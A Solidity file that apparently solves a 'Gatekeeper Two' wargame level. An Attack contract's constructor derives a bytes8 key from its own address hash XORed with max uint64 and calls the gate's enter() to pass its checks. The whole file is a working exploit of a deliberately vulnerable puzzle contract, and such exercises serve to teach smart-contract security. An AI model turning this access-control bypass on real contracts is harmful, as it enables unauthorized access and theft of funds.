//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8) external;    
}

contract Attack {
    constructor(IGatekeeperTwo gate) payable {
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
        gate.enter(gateKey);
    }
}